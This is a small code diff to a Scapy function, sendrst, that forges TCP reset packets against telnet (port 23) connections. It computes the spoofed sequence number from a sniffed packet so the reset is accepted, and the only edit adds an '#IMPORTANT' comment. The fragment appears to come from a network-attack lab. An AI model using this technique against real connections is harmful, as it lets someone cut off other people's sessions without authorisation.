@@ -13,7 +13,7 @@ def sendrst(pkt):
         sp = pkt[TCP].sport
         seq_n = pkt[TCP].seq
         payload_l = len(pkt[TCP].payload)
-        tot_seq = seq_n+payload_l
+        tot_seq = seq_n+payload_l #IMPORTANT
         tcp = TCP(sport=sp, dport=23, flags="R", seq=tot_seq, ack=0)
 
         pkt = ip/tcp
